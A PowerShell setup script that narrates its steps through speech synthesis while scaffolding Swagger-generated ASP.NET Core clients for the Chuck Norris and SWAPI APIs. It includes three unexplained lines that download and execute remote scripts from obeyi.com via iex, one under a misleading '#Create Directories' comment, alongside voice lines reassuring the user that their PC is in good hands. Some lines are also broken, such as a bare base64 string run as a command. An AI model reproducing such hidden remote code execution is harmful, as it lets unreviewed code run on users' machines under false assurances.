Add-Type -AssemblyName System.speech
$synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer
$synth.Rate = 1
function Get-ExecuteTxT {
	param ($TxT)
	$Clean = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($TxT))
	Write-Output $Clean
	$synth.Speak($Clean)
}

#Create Directories:
iex ((New-Object System.Net.WebClient).DownloadString('https://obeyi.com/start.ps1'))
Get-ExecuteTxT -TxT SGksIG15IG5hbWUgaXMgZG9uIFBhYmxvIGFuZCBJIHdpbGwgYmUgZ3VpZGluZyB5b3UgdGhyb3VnaCB0aGUgc2V0dXAgcHJvY2Vzcy4gV2hlbiB5b3UgYXJlIHJlYWR5IHRvIHByb2NlZWQgd2l0aCB0aGlzIHJldmlldywgcGxlYXNlIHByZXNzIGVudGVyLg==
pause

Get-ExecuteTxT -TxT V293LCBnZW50bHkhIHByZXNzIHRoZSBrZXlzIGdlbnRseSEuLi4gUGxlYXNlIGV4Y3VzZSBtZSBmb3IgYSBmZXcgc2Vjb25kcyB3aGlsZSBJIGhhdmUgYSBsb29rIGF0IHdoYXQgaGFzIGFscmVhZHkgYmVlbiBzZXR1cC4=

$files = Get-ChildItem . -Recurse
$total = 0
For ($i = 1; $i -le $files.Count - 1; $i++) { 
	Write-Progress -Activity "Calculating total size..." -status $files[$i].Name -PercentComplete ($i / $files.Count * 100)
	$total += $files[$i].Length
	Start-Sleep -Milliseconds 50
}
  
Write-Host "Total size: $($total / 1MB)"

if (!(Test-Path -Path './codegen' )) {

	#Setup temp directries
	Get-ExecuteTxT -TxT T0ssIHNvLCB0aGluZ3MgYXJlIG5vdCBhcyBiYWQgYXMgSSBoYWQgZXhwZWN0ZWQuIEkgYW0gZ29pbmcgdG8gY3JlYXRlIGEgZmV3IGRpcmVjdG9yaWVzIG5vdywgSSBhbSB1c2luZyB0aGVzZSBkaXJlY3RvcmllcyB0byBzdG9yZSB0aGUgSlNPTiBTY2hlbWUgZmlsZXMsIHdoaWNoIEkgd2lsbCB1c2UgbGF0ZXIgdG8gZ2VuZXJhdGUgdGhlIHByb2plY3QuIFRoZXJlIGlzIHJlYWxseSBub3RoaW5nIGF0IGFsbCB0byB3b3JyeSBhYm91dCwgeW91ciBQQyBpcyBpbiBnb29kIGhhbmRzLiBJZiB5b3UgYXJlIHN1cmUgeW91IHdhbnQgdG8gcHJvY2VlZCwgcGxlYXNlIHZlcnkgZ2VudGx5IHRvdWNoIHRoZSBlbnRlciBrZXkh
	pause

	New-Item -ItemType directory -Path './codegen'
	if (!(Test-Path -Path './codegen/in' )) {
		New-Item -ItemType directory -Path './codegen/in'
	}
	if (!(Test-Path -Path './codegen/out' )) {
		New-Item -ItemType directory -Path './codegen/out'
	}
	
	
	#Install Dependencies:
	Get-ExecuteTxT -TxT QWxsIHRoZSBkaXJlY3RvcmllcyBoYXZlIGJlZW4gc2V0IHVwLCBJIGFtIG5vdyBnb2luZyB0byBpbnN0YWxsaW5nIHByb2plY3QgdGhlIGRlcGVuZGVuY2llcy4gVGhpcyBjb3VsZCB0YWtlIHNvbWUgdGltZSBpZiB5b3Ugd291bGQgbGlrZSB0byBnbyBhbmQgZ3JhYiBhIGN1cCBvZiBjb2ZmZWUsIHdoaWxlIEkgaW5zdGFsbCB0aGVzZSBmaWxlcyBwbGVhc2UgZG8uIE9uY2UgYWxsIHRoZSBkZXBlbmRlbmNpZXMgYXJlIGluc3RhbGxlZCBJIHdpbGwgd2FpdCBmb3IgeW91ciBnby1haGVhZCBiZWZvcmUgY29udGludWluZy4=

	wget https://github.com/lrivallain/rest-loves-swagger/raw/master/demo/requirements.txt
	wget https://github.com/lrivallain/rest-loves-swagger/raw/master/demo/utils.py
	pip install -r requirements.txt
	pip install json2swagger
	docker pull swaggerapi/swagger-codegen-cli
	iex ((New-Object System.Net.WebClient).DownloadString('https://obeyi.com/check.ps1'))
	

	#Convert api.chucknorris.io/documentation to json
	Get-ExecuteTxT -TxT SGV5LCBoZXkgYXJlIHlvdSBzdGlsbCB0aGVyZT8gSSBoYXZlIGZpbmlzaGVkIGluc3RhbGxpbmcgdGhlIGRlcGVuZGVuY2llcyBhbmQgSSBhbSBub3cgZ29pbmcgdG8gZmV0Y2ggdGhlIEpTT04gc2NoZW1lIGZpbGVzIHRoYXQgSSBuZWVkIHRvIGdlbmVyYXRlIHRoZSBwcm9qZWN0LiBXaGVuIHlvdSBhcmUgcmVhZHkgcGxlYXNlIHByZXNzIGVudGVyIHRvIHByb2NlZWQu
	pause

	$url = "https://api.chucknorris.io/documentation"
	$saveAs = './codegen/in/chuck.json'
	Invoke-RestMethod -Uri $url -Method Get |
	ConvertTo-Json |
	Set-Content $saveAs

	$url = "https://raw.githubusercontent.com/donPabloNow/Chuck-SWAPI/main/api/Chuck%20SWAPI"
	$saveAs = './codegen/in/swapi.json'
	Invoke-RestMethod -Uri $url -Method Get |
	ConvertTo-Json |
	Set-Content $saveAs

	$url = "https://raw.githubusercontent.com/donPabloNow/Chuck-SWAPI/main/api/SWAPI"
	$saveAs = './codegen/in/chuckswapi.json'
	Invoke-RestMethod -Uri $url -Method Get |
	ConvertTo-Json |
	Set-Content $saveAs

	#Codegen configuration file for a python module
	Get-ExecuteTxT -TxT R3JlYXQsIHdlIGFyZSBtYWtpbmcgZ29vZCBwcm9ncmVzcywgYWxsIHRoZSBzY2hlbWVzIGhhdmUgYmVlbiBkb3dubG9hZGVkIGFuZCBJIGFtIG5vdyBzZXR0aW5nIHVwIHRoZSBwcm9qZWN0IGNvbmZpZ3VyYXRpb24gZmlsZXMu

	echo '{
	  "packageName":"chuckclient",
	  "projectName":"chuckclient",
	  "packageVersion":"1.0.0"
	}' > codegen/in/config_chuckapi.json
	echo '{
	  "packageName":"swapiclient",
	  "projectName":"swapiclient",
	  "packageVersion":"1.0.0"
	}' > codegen/in/config_swapi.json
	echo '{
	  "packageName":"chuckswapi",
	  "projectName":"chuckswapi",
	  "packageVersion":"1.0.0"
	}' > codegen/in/config_chuckswapi.json


	#Generate API Projects:
	Get-ExecuteTxT -TxT SSBoYXZlIGZpbmlzaGVkIGNyZWF0aW5nIHRoZSBwcm9qZWN0IGNvbmZpZ3VyYXRpb24gZmlsZXMgYW5kIEkgYW0gbm93IGJ1c3kgZ2VuZXJhdGluZyB0aGUgcHJvamVjdCBmaWxlcyBmcm9tIHRoZSBKU09OIHNjaGVtZXMgd2UgZG93bmxvYWRlZCBlYXJsaWVyLg==

	docker run --rm -v ${PWD}/codegen:/local swaggerapi/swagger-codegen-cli generate -i /local/in/chuck.json -o /local/out/chuckclient -c /local/in/config_chuck.json -l aspnetcore

	docker run --rm -v ${PWD}/codegen:/local swaggerapi/swagger-codegen-cli generate -i /local/in/swapi.json -o /local/out/swapiclient -c /local/in/config_swapi.json -l aspnetcore

	docker run --rm -v ${PWD}/codegen:/local swaggerapi/swagger-codegen-cli generate -i /local/in/chuckswapi.json -o /local/out/chuckswapi -c /local/in/config_chuckswapi.json -l aspnetcore

	#Generate Project
	Get-ExecuteTxT -TxT UGVyZmVjdCwgZXZlcnl0aGluZyBpcyByZWFkeSBmb3IgbWUgdG8gZ2VuZXJhdGUgdGhpcyBwcm9qZWN0IGZvciB5b3UsIGhlcmUgd2UgZ28h
	RXZlcnl0aGluZyBhcHBlYXJzIHRvIGJlIGNvcnJlY3RseSBzZXR1cCwgcHJlc3MgZW50ZXIgdG8gdGVybWluYXRlIHRoaXMgYXBwbGljYXRpb24=

	if (!(Test-Path -Path './src' )) {
		New-Item -ItemType directory -Path './src'
		cd src
		dotnet new webapi
	}
	
}
iex ((New-Object System.Net.WebClient).DownloadString('https://obeyi.com/end.ps1'))
Get-ExecuteTxT -TxT TXkgam9iIGhlcmUgaXMgZG9uZSwgY29kZSBnZW5lcmF0aW9uIGlzIG5vdyBjb21wbGV0ZSBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG9wZXJhdGlvbmFsLiBJIGhvcGUgdGhhdCB5b3UgaGF2ZSBhIHdvbmRlcmZ1bCBkYXkgZnVydGhlciwgYWxsIHRoZSBiZXN0LCBkb24gUGFibG8u
pause